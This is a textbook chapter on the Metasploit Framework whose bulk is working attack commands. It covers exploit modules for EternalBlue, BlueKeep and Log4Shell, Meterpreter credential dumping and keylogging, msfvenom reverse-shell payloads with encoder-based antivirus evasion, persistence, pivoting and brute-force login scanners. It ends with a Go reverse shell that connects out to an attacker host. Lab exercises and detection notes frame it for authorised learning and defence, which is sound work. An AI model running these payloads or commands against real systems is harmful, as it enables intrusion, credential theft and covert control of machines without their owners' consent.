# Chapter 37: Metasploit Framework — The Attacker's Swiss Army Knife

*Metasploit is the world's most used penetration testing framework. It provides a consistent interface for exploit development, payload generation, and post-exploitation — all in one tool.*

---

## Architecture

```
Metasploit Framework
├── Modules
│   ├── Exploits         — attack code for specific vulnerabilities
│   ├── Payloads         — what runs after exploitation (shells, Meterpreter)
│   ├── Auxiliary        — scanners, fuzzers, recon tools
│   ├── Post             — post-exploitation modules
│   ├── Encoders         — obfuscate payloads
│   └── Nops             — NOP sleds for exploits
├── msfconsole           — interactive CLI
├── msfvenom             — payload generator
└── Metasploit Pro       — commercial GUI version
```

---

## msfconsole Basics

```
msfconsole

msf6 > search type:exploit name:eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info

# Set options
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.200
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# Choose payload
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
msf6 exploit(ms17_010_eternalblue) > exploit
# or: run
```

---

## Common Exploits

```bash
# EternalBlue (MS17-010) — unpatched Windows SMB
use exploit/windows/smb/ms17_010_eternalblue

# BlueKeep (CVE-2019-0708) — RDP pre-auth RCE
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# Log4Shell (CVE-2021-44228) — Log4j RCE
use exploit/multi/http/log4shell_header_injection

# PrintNightmare (CVE-2021-1675) — Windows Print Spooler
use exploit/windows/local/cve_2021_1675_printnightmare

# Apache Struts (CVE-2017-5638) — used in Equifax breach
use exploit/multi/http/struts2_content_type_ognl
```

---

## Meterpreter — Advanced Payload

Meterpreter is an advanced payload that lives entirely in memory (no file on disk):

```
meterpreter > sysinfo           # system information
meterpreter > getuid            # current user
meterpreter > getsystem         # attempt privilege escalation
meterpreter > getpid            # current process ID
meterpreter > ps                # list processes
meterpreter > migrate 864       # migrate to another process (e.g., explorer.exe)

meterpreter > hashdump          # dump SAM database
meterpreter > load kiwi         # load mimikatz module
meterpreter > creds_all         # dump all credentials

meterpreter > shell             # drop to cmd.exe
meterpreter > upload /path/file C:\\Users\\user\\file   # upload file
meterpreter > download C:\\sensitive.txt /local/path    # download file

meterpreter > portfwd add -l 3306 -p 3306 -r 10.10.10.5  # port forward

meterpreter > keyscan_start     # keylogger
meterpreter > keyscan_dump      # dump keys
meterpreter > screenshot        # take screenshot

meterpreter > run post/multi/recon/local_exploit_suggester  # local privesc
```

---

## msfvenom — Payload Generation

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f elf -o shell

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f ps1 -o shell.ps1

# Web shells
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o shell.php
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f war -o shell.war

# Encoded (basic AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 \
    -e x64/xor_dynamic -i 10 -f exe -o encoded.exe
```

---

## Setting Up a Listener

```bash
# Start listener before payload runs
msfconsole -q -x "use exploit/multi/handler; \
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
    set LHOST 192.168.1.200; \
    set LPORT 4444; \
    run"
```

---

## Post-Exploitation Modules

```bash
# Enumerate
run post/windows/gather/enum_system
run post/windows/gather/enum_applications
run post/windows/gather/credentials/credential_collector

# Privilege escalation
run post/multi/recon/local_exploit_suggester

# Persistence
run post/windows/manage/persistence STARTUP=SCHEDULER DELAY=5

# Pivoting — use compromised host as proxy to internal network
# Add route through Meterpreter session
route add 10.10.10.0/24 [session_id]
# Then scan internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run
```

---

## Pivoting and Lateral Movement

```bash
# SOCKS proxy through Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Configure proxychains
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

# Now use any tool through the pivot
proxychains nmap -sT 10.10.10.5
proxychains crackmapexec smb 10.10.10.0/24
```

---

## Auxiliary Scanners

```bash
# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
run

# SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# HTTP login brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set AUTH_URI /admin/
run
```

---

## Go: Simple Reverse Shell (Educational)

```go
// For understanding how reverse shells work at the protocol level
// Run ONLY on machines you own and control

package main

import (
    "net"
    "os/exec"
)

// Educational: how a reverse shell initiates a connection to attacker
// This helps understand what to DETECT in a defender context
func reverseShell(lhost string, lport string) {
    conn, err := net.Dial("tcp", lhost+":"+lport)
    if err != nil {
        return
    }
    defer conn.Close()
    
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}

// DEFENSIVE USE: GoShield should detect:
// 1. Process creating outbound TCP connection
// 2. Shell process (sh/bash/cmd) with stdin/stdout to network socket
// 3. Processes spawned by web servers (httpd spawning /bin/sh)
```

---

## Summary

| Module Type | Purpose | Example |
|-------------|---------|---------|
| Exploit | Attack specific CVE | ms17_010_eternalblue |
| Payload | Shell/Meterpreter delivered | windows/x64/meterpreter/reverse_tcp |
| Auxiliary | Scanning, brute force | scanner/smb/smb_version |
| Post | After exploitation | windows/gather/hashdump |
| Encoder | Obfuscate payload | x64/xor_dynamic |

---

## Exercises

1. Set up Metasploitable 3 in a VM — it's intentionally vulnerable
2. Exploit MS17-010 against an unpatched Windows 7 VM in your lab
3. Use local_exploit_suggester after getting a Meterpreter shell — what does it find?
4. Build a detection rule for GoShield that catches Meterpreter's process migration behavior
